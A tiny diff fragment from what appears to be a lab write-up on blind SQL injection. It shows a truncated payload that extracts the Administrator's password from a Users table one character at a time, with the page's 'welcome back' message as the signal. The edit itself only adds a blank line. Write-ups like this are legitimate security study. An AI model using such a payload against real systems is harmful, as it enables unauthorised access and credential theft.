@@ -28,3 +28,4 @@ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator')
 ```
 
 It will return the **welcome back** when first character of password will be s
+
